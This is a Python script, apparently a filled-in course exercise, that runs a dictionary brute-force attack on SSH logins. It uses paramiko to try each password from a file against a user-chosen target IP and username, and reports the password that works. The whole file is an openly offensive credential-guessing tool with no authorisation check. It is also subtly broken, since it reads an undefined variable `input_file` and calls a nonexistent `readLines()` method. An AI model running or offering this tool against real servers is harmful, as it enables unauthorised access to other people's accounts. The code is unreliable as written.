import paramiko
import sys
import os
import socket
import termcolor

def ssh_connect(host, username, password, value=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # invoke the ssh.connect function and pass 4 parameters
        #-----------------
        ssh.connect(host, port=22, username=username, password=password)
        #-----------------
    except paramiko.AuthenticationException:
        value = 1
    except socket.error as e:
        value = 2
    # close the ssh connection
    # return value
    #--------------
    ssh.close()
    return value
    #---------------

def main():
    # Prompt the user to enter target, username, and the password file
    #---------------
    target = input('Enter the IP of the target SSH server: ')
    username = input('Enter the username to be used during the attempted SSH connections: ')
    password_file = input('Enter the path of your password_file: ')
    #---------------
    # check if the file exists
    # if not, exit
    #-------------
    if os.path.exists(password_file) == False:
        print('Password file not found.')
        sys.exit(1)
    #--------------
    with open(input_file, 'r') as file:
        # iterate over each line
        # strip the empty characters at the end, store in a password variable
        #------------
        for line in file.readLines():
            password = line.strip()
        #--------------
            try:
                # invoke ssh_connect function and pass target, username, and password
                # store the return value in a variable
                # if return value is 0
                # print 'found password', print the password, and break out the program
                # else if the return value is 1
                # print 'incorrect login'
                # else if the return value is 2
                # print 'connection error'
                # sys.exit()
                # -------------
                response = ssh_connect(target, username, password)
                if response == 0:
                    print('found password: ' + str(password))
                    sys.exit()
                elif response == 1:
                    print('incorrect login')
                elif response == 2:
                    print('connection error')
                    sys.exit()
                # -------------
            except Exception as e:
                print(e)
                pass
if __name__ == '__main__':
    main()